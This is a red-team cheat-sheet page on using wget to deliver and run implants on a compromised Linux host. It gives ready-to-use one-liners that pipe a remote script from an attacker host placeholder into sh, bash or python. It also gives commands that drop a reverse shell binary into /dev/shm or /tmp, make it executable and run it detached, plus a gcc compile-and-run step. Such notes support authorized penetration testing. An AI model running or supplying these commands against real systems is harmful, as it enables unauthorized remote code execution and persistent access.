# Wget

## 01 - Fileless Code Execution

This is useful if the machine doesn't have `curl` pre-installed so you can use `wget` to execute it in memory.

```
$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | sh

$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | bash

$ wget --no-hsts -qO- http[s]://<IP>/implant.py | python
```

## 02 - Dropping On Memory

> [!INFO] Got Permission Denied!
> If you get a `Permission denied` error while executing it in `/dev/shm/`. Check the [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xM - System and Kernel Version/Manual/Living off the Land#^017cc1|mounted drives]] if `noexec` is configured. Otherwise execute it with a [[#01 - Fileless Code Execution|fileless]] method.

Download reverse shell binary and execute it.

```
$ wget --no-hsts -P /dev/shm http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown

$ wget --no-hsts -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
```

## 03 - Dropping On Disk

Download reverse shell binary and execute it.

```
$ wget --no-hsts -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; /tmp/implant & disown
```

## 04 - Compiled After Delivery

TODO: Fill this info

```
$ gcc -o implant implant.c && implant & disown
```

---
## References

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### GTFOBins

- [GTFOBins: wget](https://gtfobins.github.io/gtfobins/wget/)

### GTFOArgs

- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)

### DMCXBlue

- [DMCXBlue: Attachments - Scripting Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-attachment/attachments-scripting-files)